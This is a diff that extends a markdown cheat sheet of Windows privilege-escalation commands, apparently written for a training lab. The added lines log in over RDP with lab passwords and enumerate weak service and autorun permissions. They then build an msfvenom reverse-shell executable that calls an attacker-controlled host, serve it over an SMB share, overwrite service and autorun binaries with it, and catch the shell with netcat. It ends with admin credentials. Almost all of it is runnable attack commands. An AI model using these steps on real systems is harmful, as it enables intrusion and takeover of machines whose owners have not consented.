@@ -139,6 +139,8 @@ hostname
 
 ## CATEGORY "SERVICES" - INSECURE SERVICE PERMISSIONS
 ```
+xfreerdp /u:user /p:password321 /cert:ignore /v:10.10.128.34
+
 .\winPEASany.exe servicesinfo (powershell)
 winPEASany.exe servicesinfo (cmd)
 
@@ -151,6 +153,8 @@ sc start daclsvc
 
 ## CATEGORY "SERVICES" - UNQUOTED SERVICE PATHS
 ```
+xfreerdp /u:user /p:password321 /cert:ignore /v:10.10.128.34
+
 .\winPEASany.exe servicesinfo (powershell)
 winPEASany.exe servicesinfo (cmd)
 
@@ -163,6 +167,8 @@ sc start unquotedsvc
 
 ## CATEGORY "SERVICES" - WEAK REGISTRY PERMISSIONS
 ```
+xfreerdp /u:user /p:password321 /cert:ignore /v:10.10.128.34
+
 .\winPEASany.exe servicesinfo (powershell)
 winPEASany.exe servicesinfo (cmd)
 
@@ -173,7 +179,37 @@ reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND
 net start regsvc
 ```
 
+## CATEGORY "SERVICES" - INSECURE SERVICES EXECUTEABLES
+```
+xfreerdp /u:user /p:password321 /cert:ignore /v:10.10.128.34
 
+.\winPEASany.exe servicesinfo (powershell)
+C:\PrivEsc\winPEASany.exe servicesinfo (cmd)
+
+sc qc filepermsvc
+C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
+copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y
+net start filepermsvc
+```
+
+## CATEGORY "REGISTRY" - AUTORUNS 
+```
+xfreerdp /u:user /p:password321 /cert:ignore /v:10.10.128.34
+
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+C:\PrivEsc\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
+
+cd /var/www/html/priv_esc
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.18.5.137 LPORT=1234 -f exe -o reverse.exe
+python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
+
+copy \\10.18.5.137\kali\reverse.exe C:\PrivEsc\reverse.exe
+copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y
+
+nc -nlvp 1234
+rdesktop 10.10.128.34
+admin/password123
+```
 
 
 
